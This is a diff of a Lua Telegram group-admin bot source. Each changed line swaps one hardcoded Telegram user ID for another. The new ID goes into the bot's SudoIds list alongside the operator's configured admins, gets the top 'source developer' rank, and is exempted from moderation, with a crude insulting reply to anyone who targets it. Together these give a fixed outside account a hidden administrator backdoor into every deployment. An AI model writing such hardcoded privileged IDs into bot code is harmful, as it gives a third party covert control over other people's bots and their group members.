@@ -127,7 +127,7 @@ LaUrEn Source
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n━─━─━─ 𖣂 ─━─━─━ ≈ ┉ ≈ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m━─━─━─ 𖣂 ─━─━─━ ≈ ┉ ≈ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId or Config.SUDO
-SudoIds = {Config.SudoIds,742655070,1685937761} or {Config.sudo_users,742655070,1685937761}
+SudoIds = {Config.SudoIds,742655070,1783964439} or {Config.sudo_users,742655070,1783964439}
 LaUrEn = Config.LaUrEn or Config.bot_id
 TokenBot = Config.TokenBot or Config.token
 NameBot = (DevAli:get(LaUrEn..'Ali:NameBot') or 'سناب')
@@ -593,7 +593,7 @@ end ,nil)
 end
 --     Source LaUrEn     --
 local AliRank = function(msg) if SudoId(msg.sender_user_id_) then LaUrEnTEAM  = "المطور" elseif SecondSudo(msg) then LaUrEnTEAM = "المطور" elseif SudoBot(msg) then LaUrEnTEAM = "المطور" elseif ManagerAll(msg) then LaUrEnTEAM = "المدير" elseif AdminAll(msg) then LaUrEnTEAM = "الادمن" elseif AliConstructor(msg) then LaUrEnTEAM = "المالك" elseif BasicConstructor(msg) then LaUrEnTEAM = "المنشئ" elseif Constructor(msg) then LaUrEnTEAM = "المنشئ" elseif Manager(msg) then LaUrEnTEAM = "المدير" elseif Admin(msg) then LaUrEnTEAM = "الادمن" else LaUrEnTEAM = "العضو" end return LaUrEnTEAM end
-function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1685937761) then LaUrEnTEAM = 'مطور السورس' elseif tonumber(user_id) == tonumber(LaUrEn) then LaUrEnTEAM = 'البوت' elseif SudoId(user_id) then LaUrEnTEAM = 'المطور الاساسي' elseif DevAli:sismember(LaUrEn..'Ali:SecondSudo:', user_id) then LaUrEnTEAM = 'المطور الثانوي' elseif DevAli:sismember(LaUrEn..'Ali:SudoBot:', user_id) then LaUrEnTEAM = DevAli:get(LaUrEn.."Ali:SudoBot:Rd"..chat_id) or 'المطور' elseif DevAli:sismember(LaUrEn..'Ali:ManagerAll:', user_id) then LaUrEnTEAM = DevAli:get(LaUrEn.."Ali:Managers:Rd"..chat_id) or 'المدير العام' elseif DevAli:sismember(LaUrEn..'Ali:AdminAll:', user_id) then LaUrEnTEAM = DevAli:get(LaUrEn.."Ali:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevAli:sismember(LaUrEn..'Ali:VipAll:', user_id) then LaUrEnTEAM = DevAli:get(LaUrEn.."Ali:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevAli:sismember(LaUrEn..'Ali:AliConstructor:'..chat_id, user_id) then LaUrEnTEAM = 'المالك' elseif DevAli:sismember(LaUrEn..'Ali:BasicConstructor:'..chat_id, user_id) then LaUrEnTEAM = DevAli:get(LaUrEn.."Ali:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevAli:sismember(LaUrEn..'Ali:Constructor:'..chat_id, user_id) then LaUrEnTEAM = DevAli:get(LaUrEn.."Ali:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevAli:sismember(LaUrEn..'Ali:Managers:'..chat_id, user_id) then LaUrEnTEAM = DevAli:get(LaUrEn.."Ali:Managers:Rd"..chat_id) or 'المدير' elseif DevAli:sismember(LaUrEn..'Ali:Admins:'..chat_id, user_id) then LaUrEnTEAM = DevAli:get(LaUrEn.."Ali:Admins:Rd"..chat_id) or 'الادمن' elseif DevAli:sismember(LaUrEn..'Ali:VipMem:'..chat_id, user_id) then  LaUrEnTEAM = DevAli:get(LaUrEn.."Ali:VipMem:Rd"..chat_id) or 'المميز' elseif DevAli:sismember(LaUrEn..'Ali:Cleaner:'..chat_id, user_id) then  LaUrEnTEAM = DevAli:get(LaUrEn.."Ali:Cleaner:Rd"..chat_id) or 'المنظف' else LaUrEnTEAM = DevAli:get(LaUrEn.."Ali:mem:Rd"..chat_id) or 'العضو' end return LaUrEnTEAM end
+function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1783964439) then LaUrEnTEAM = 'مطور السورس' elseif tonumber(user_id) == tonumber(LaUrEn) then LaUrEnTEAM = 'البوت' elseif SudoId(user_id) then LaUrEnTEAM = 'المطور الاساسي' elseif DevAli:sismember(LaUrEn..'Ali:SecondSudo:', user_id) then LaUrEnTEAM = 'المطور الثانوي' elseif DevAli:sismember(LaUrEn..'Ali:SudoBot:', user_id) then LaUrEnTEAM = DevAli:get(LaUrEn.."Ali:SudoBot:Rd"..chat_id) or 'المطور' elseif DevAli:sismember(LaUrEn..'Ali:ManagerAll:', user_id) then LaUrEnTEAM = DevAli:get(LaUrEn.."Ali:Managers:Rd"..chat_id) or 'المدير العام' elseif DevAli:sismember(LaUrEn..'Ali:AdminAll:', user_id) then LaUrEnTEAM = DevAli:get(LaUrEn.."Ali:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevAli:sismember(LaUrEn..'Ali:VipAll:', user_id) then LaUrEnTEAM = DevAli:get(LaUrEn.."Ali:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevAli:sismember(LaUrEn..'Ali:AliConstructor:'..chat_id, user_id) then LaUrEnTEAM = 'المالك' elseif DevAli:sismember(LaUrEn..'Ali:BasicConstructor:'..chat_id, user_id) then LaUrEnTEAM = DevAli:get(LaUrEn.."Ali:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevAli:sismember(LaUrEn..'Ali:Constructor:'..chat_id, user_id) then LaUrEnTEAM = DevAli:get(LaUrEn.."Ali:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevAli:sismember(LaUrEn..'Ali:Managers:'..chat_id, user_id) then LaUrEnTEAM = DevAli:get(LaUrEn.."Ali:Managers:Rd"..chat_id) or 'المدير' elseif DevAli:sismember(LaUrEn..'Ali:Admins:'..chat_id, user_id) then LaUrEnTEAM = DevAli:get(LaUrEn.."Ali:Admins:Rd"..chat_id) or 'الادمن' elseif DevAli:sismember(LaUrEn..'Ali:VipMem:'..chat_id, user_id) then  LaUrEnTEAM = DevAli:get(LaUrEn.."Ali:VipMem:Rd"..chat_id) or 'المميز' elseif DevAli:sismember(LaUrEn..'Ali:Cleaner:'..chat_id, user_id) then  LaUrEnTEAM = DevAli:get(LaUrEn.."Ali:Cleaner:Rd"..chat_id) or 'المنظف' else LaUrEnTEAM = DevAli:get(LaUrEn.."Ali:mem:Rd"..chat_id) or 'العضو' end return LaUrEnTEAM end
 --     Source LaUrEn     --
 function RankChecking(user_id,chat_id)
 if SudoId(user_id) then
@@ -4417,7 +4417,7 @@ end
 if text == "مطور السورس" or text == "مطور السورس" or text == "المبرمج" then 
 Text = "• *The - ٌ𝆥 tِuِoٰfٌe ٰaٌِlٰHٰaٌِlfٍi⤹ - and programmer of this source is* : [- ٌ𝆥 tِuِoٰfٌe ٰaٌِlٰHٰaٌِlfٍi⤹ -](https://t.me/RFRFF)."
 keyboard = {} 
-keyboard.inline_keyboard = {{{text='- KٰaRٍiUsَ ◞ •',url="t.me/RFRFF"}}}
+keyboard.inline_keyboard = {{{text='- ٌ𝆥 tِuِoٰfٌe ٰaٌِlٰHٰaٌِlfٍi⤹ -',url="t.me/RFRFF"}}}
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id='..msg.chat_id_..'&photo=https://t.me/RFRFF&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 return false
@@ -4436,7 +4436,7 @@ if tonumber(result.id_) == tonumber(DevId) then
 Dev_Ali(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
-if tonumber(result.id_) == tonumber(1685937761) then 
+if tonumber(result.id_) == tonumber(1783964439) then 
 Dev_Ali(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
@@ -4467,7 +4467,7 @@ if tonumber(result.sender_user_id_) == tonumber(DevId) then
 Dev_Ali(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
-if tonumber(result.sender_user_id_) == tonumber(1685937761) then  
+if tonumber(result.sender_user_id_) == tonumber(1783964439) then  
 Dev_Ali(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
